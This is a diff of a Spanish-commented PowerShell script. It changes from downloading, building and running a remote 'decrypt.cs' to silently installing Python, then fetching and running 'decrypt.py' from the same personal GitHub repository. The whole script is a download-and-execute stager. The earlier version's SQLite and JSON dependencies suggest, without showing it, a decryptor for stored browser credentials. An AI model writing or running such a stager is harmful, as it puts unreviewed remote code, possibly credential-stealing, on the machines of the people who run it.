@@ -1,45 +1,29 @@
-# Define la URL para el archivo decrypt.cs
-$decryptCsUrl = "https://raw.githubusercontent.com/PamvInf/test/master/decrypt.cs"
+# Define las URLs para el instalador de Python, decrypt.py y requirements.txt
+$pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
+$decryptPyUrl = "https://raw.githubusercontent.com/PamvInf/test/master/decrypt.py"
+$requirementsTxtUrl = "https://raw.githubusercontent.com/PamvInf/test/master/requirements.txt"
 
-# Define la ruta de la carpeta del proyecto y el nombre del archivo
-$projectPath = "$env:TEMP\DecryptProject"
-$decryptCsFileName = "decrypt.cs"
-$decryptCsPath = Join-Path $projectPath $decryptCsFileName
+# Define las rutas de descarga locales
+$pythonInstallerPath = "$env:TEMP\python-installer.exe"
+$decryptPyPath = "$env:TEMP\decrypt.py"
+$requirementsTxtPath = "$env:TEMP\requirements.txt"
 
-# Crear carpeta del proyecto si no existe
-if (-not (Test-Path $projectPath)) {
-    New-Item -ItemType Directory -Path $projectPath
-}
+# Descarga el instalador de Python
+Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath
 
-# Descarga decrypt.cs en la carpeta del proyecto
-Invoke-WebRequest -Uri $decryptCsUrl -OutFile $decryptCsPath
+# Instala Python sin GUI
+Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
 
-# Verificar si .NET CLI está disponible
-if (-not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
-    Write-Error "El .NET CLI no está instalado o no está en el PATH. Por favor, instala el SDK de .NET."
-    exit 1
-}
+# Descarga decrypt.py y requirements.txt
+Invoke-WebRequest -Uri $decryptPyUrl -OutFile $decryptPyPath
+Invoke-WebRequest -Uri $requirementsTxtUrl -OutFile $requirementsTxtPath
 
-# Navegar a la carpeta del proyecto
-Push-Location -Path $projectPath
+# Instala las dependencias de Python desde requirements.txt
+# Asegúrate de que el comando "pip" esté disponible en el PATH. Si no es así, ajusta la ruta a pip.exe según sea necesario.
+pip install -r $requirementsTxtPath
 
-# Crear un nuevo proyecto de consola .NET
-dotnet new console -n DecryptProject -o .
+# Ejecuta decrypt.py
+python $decryptPyPath
 
-# Agregar las dependencias necesarias al proyecto
-dotnet add package System.Data.SQLite.Core
-dotnet add package Newtonsoft.Json
-
-# Mover el archivo decrypt.cs al proyecto y sobreescribir el archivo Program.cs generado automáticamente
-Move-Item -Path $decryptCsPath -Destination "Program.cs" -Force
-
-# Compilar el proyecto
-dotnet build
-
-# Ejecutar el proyecto
-dotnet run
-
-# Volver a la carpeta anterior
-Pop-Location
-
-Write-Host "Script completado. El proyecto se ha ejecutado correctamente."
+exit
+exit
